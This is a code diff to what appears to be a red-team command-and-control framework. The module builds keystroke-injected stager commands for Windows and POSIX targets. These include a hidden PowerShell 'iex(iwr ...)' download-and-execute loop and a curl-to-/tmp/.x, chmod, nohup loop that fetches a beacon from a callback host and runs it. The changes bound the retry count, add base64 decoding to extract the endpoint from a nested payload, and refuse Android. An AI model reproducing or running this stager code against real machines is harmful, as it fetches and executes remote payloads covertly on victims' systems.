@@ -25,7 +25,9 @@ the command keeps polling until the download succeeds, then breaks.
 
 from __future__ import annotations
 
-from typing import Optional, Tuple
+import base64
+import re
+from typing import List, Optional, Tuple
 
 # Windows loaders, ordered by a real trade-off (see `loader_notes`):
 #   * "powershell" — hidden + a retry LOOP (resilient), no disk, but AMSI-visible
@@ -36,6 +38,15 @@ LOADERS = ("powershell", "mshta")
 
 # default retry cadence (seconds) for the client-side loop
 DEFAULT_RETRY_S = 30
+
+# How many times the client-side loop may try before it gives up. BOUNDED on
+# purpose: `while(1)` against a C2 that never answers is an invisible process
+# retrying for ever on the target — no end, no error, nothing the operator can
+# point at — and a single mistyped endpoint then costs the engagement. 20 x 30s
+# is ten minutes, enough for a late C2, short enough to be accountable.
+# Overridable per engagement: `c2.stager_attempts` / PHANTOM_STAGER_ATTEMPTS,
+# or `--stager-attempts <n>` on the `payload hid` command.
+DEFAULT_ATTEMPTS = 20
 
 # The board TYPES the command on screen, one keystroke at a time. The full
 # resilient PIC stager is ~11.4k chars (measured: an operator timed minutes of
@@ -118,15 +129,25 @@ def delivery_for(user_agent: Optional[str], base_url: str,
     return platform, url
 
 
-def _win_retry_loop(inner: str, retry_s: int) -> str:
-    """A one-liner retry loop around ``inner`` (runs once it finally succeeds)."""
-    return (f"while(1){{try{{{inner};break}}catch{{sleep {max(1, int(retry_s))}}}}}"
-            )
+def _win_retry_loop(inner: str, retry_s: int, attempts: int) -> str:
+    """A BOUNDED one-liner retry loop around ``inner``.
+
+    Runs ``inner`` until it succeeds or the attempt budget runs out, then
+    returns — the shell exits instead of leaving a hidden process polling a
+    dead endpoint for ever. The counter and the budget are both visible in
+    the typed text, so an operator reading the artefact can tell how long the
+    board's delivery window is.
+    """
+    gap = max(1, int(retry_s))
+    tries = max(1, int(attempts))
+    return (f"$i=0;while($i -lt {tries}){{try{{{inner};break}}catch{{$i++;"
+            f"sleep {gap}}}}}")
 
 
 def build_short_stager(platform: str, url: str, *,
                        host: str = "", port: int = 0, ssl: bool = True,
                        retry_s: int = DEFAULT_RETRY_S,
+                       attempts: int = DEFAULT_ATTEMPTS,
                        loader: str = "powershell") -> str:
     """Build the SHORT typed command for one OS.
 
@@ -168,7 +189,7 @@ def build_short_stager(platform: str, url: str, *,
             # shortest, windowless, but a single shot (cannot loop)
             return f'mshta "{url}"'
         fetch = ("iex(iwr '" + url + "' -UseB).Content")
-        loop = _win_retry_loop(fetch, retry_s)
+        loop = _win_retry_loop(fetch, retry_s, attempts)
         return 'powershell -w h -c "' + loop + '"'
 
     # POSIX: sh -c '<loop>; <run detached>'
@@ -191,9 +212,15 @@ def build_short_stager(platform: str, url: str, *,
     out = "/tmp/.x"
     run = (f"{out} {host} {int(port)} {1 if ssl else 0}"
            if host else f"{out}")
-    inner = (f'while ! curl -{flags} "{url}" -o {out};do sleep '
-             f"{max(1, int(retry_s))};done;chmod +x {out};"
-             f"nohup {run} >/dev/null 2>&1 &")
+    # Same budget as the Windows loader, and the same reason: after `tries`
+    # failed fetches the script EXITS instead of polling a dead endpoint for
+    # ever. The counter lives inside the single-quoted wrapper, so the outer
+    # shell never sees it.
+    gap = max(1, int(retry_s))
+    tries = max(1, int(attempts))
+    inner = (f'i=0;while ! curl -{flags} "{url}" -o {out};do i=$((i+1));'
+             f'[ $i -ge {tries} ]&&exit 1;sleep {gap};done;'
+             f'chmod +x {out};nohup {run} >/dev/null 2>&1 &')
     return "sh -c '" + inner + "'"
 
 
@@ -210,6 +237,77 @@ def build_universal_fetch(url: str) -> str:
     if not url:
         raise ValueError("universal fetch needs a URL")
     return url
+
+
+def _configured_attempts() -> int:
+    """How many fetches the client-side loop may spend, per engagement."""
+    try:
+        from phantom.utils import config as cfg
+        return max(1, cfg.get_int("c2.stager_attempts", DEFAULT_ATTEMPTS,
+                                  env="PHANTOM_STAGER_ATTEMPTS"))
+    except Exception:
+        return DEFAULT_ATTEMPTS
+
+
+def _base64_blobs(text: str) -> List[str]:
+    """Base64-looking tokens long enough to be a payload, not a word."""
+    return [m.group(0) for m in
+            re.finditer(r"[A-Za-z0-9+/]{40,}={0,2}", text or "")]
+
+
+def _decode_layer(text: str) -> str:
+    """Everything a layer of base64 hides, plus the layer itself."""
+    out = [text or ""]
+    for blob in _base64_blobs(text):
+        try:
+            raw = base64.b64decode(blob + "=" * (-len(blob) % 4))
+        except Exception:
+            continue
+        for enc in ("utf-16-le", "utf-8"):
+            try:
+                decoded = raw.decode(enc)
+            except (UnicodeDecodeError, ValueError):
+                continue
+            if decoded.isprintable() or "\n" in decoded:
+                out.append(decoded)
+                break
+    return "\n".join(out)
+
+
+def endpoint_from_registered_command(
+        command: str) -> Optional[Tuple[str, int, bool]]:
+    """(host, port, use_ssl) the command `--from-payload` would type targets.
+
+    That command was built for ONE endpoint, and it is the only one its beacon
+    will ever call back to. A short stager pointed at the CURRENT session
+    config instead would fetch a beacon built for somewhere else — the kind of
+    mismatch that looks fine in the artefact and fails on the target — so the
+    endpoint is READ OUT of the registered command.
+
+    `generate` nests base64 (a `-Enc` launcher on Windows; on POSIX an
+    `echo <b64> | base64 -d | sh` around a script that carries the command
+    again), so this peels a few layers and scans everything it finds. Returns
+    None when no layer yields a URL, so the caller can REFUSE instead of
+    quietly typing a fetcher pointed at the wrong listener.
+    """
+    text = command or ""
+    for _ in range(4):
+        widened = _decode_layer(text)
+        if widened == text:
+            break
+        text = widened
+    match = re.search(r"(https?)://([^/:\s]+):(\d{1,5})", text)
+    if not match:
+        return None
+    scheme, host, port = match.group(1), match.group(2), int(match.group(3))
+    if not re.fullmatch(r"[A-Za-z0-9._\-]+", host):
+        return None
+    if not 0 < port < 65536:
+        return None
+    # The SCHEME travels with the endpoint: a payload built for http:// must
+    # keep fetching over http://, or the short stager reintroduces the very
+    # mismatch it exists to avoid.
+    return host, port, scheme == "https"
 
 
 def download_route(platform: str) -> str:
@@ -244,7 +342,8 @@ def short_stager_url(platform: str, base_url: str, token: str = "") -> str:
 
 def hid_download_command(platform: str, host: str, port: int, *,
                          token: str = "", ssl: bool = True,
-                         retry_s: int = DEFAULT_RETRY_S) -> str:
+                         retry_s: int = DEFAULT_RETRY_S,
+                         attempts: Optional[int] = None) -> str:
     """The command a HID board types in ``--stager-mode download``.
 
     ONE function decides the endpoint, the fetch and the length cap, so the
@@ -261,10 +360,20 @@ def hid_download_command(platform: str, host: str, port: int, *,
     if platform not in _PLATFORMS:
         raise ValueError(f"unknown platform {platform!r}: choose from "
                          f"{', '.join(_PLATFORMS)}")
+    if platform == "android":
+        # A USB keyboard board has nothing to inject into on Android and
+        # cannot install an APK for you: it is an HTTP channel, so a "typed
+        # fetcher" is not a delivery path there. Refusing beats handing back
+        # a POSIX curl loop aimed at an APK.
+        raise ValueError(
+            "Android is not a HID channel (no keyboard to type into, and a "
+            "board cannot install the APK): deliver it over HTTP with the "
+            "android stager, not with --stager-mode")
+    tries = _configured_attempts() if attempts is None else max(1, int(attempts))
     scheme = "https" if ssl else "http"
     url = short_stager_url(platform, f"{scheme}://{host}:{int(port)}", token)
     command = build_short_stager(platform, url, host=host, port=int(port),
-                                 ssl=ssl, retry_s=retry_s)
+                                 ssl=ssl, retry_s=retry_s, attempts=tries)
     if len(command) > MAX_TYPED_CHARS:
         raise ValueError(
             f"the {platform} download stager is {len(command)} chars, over "
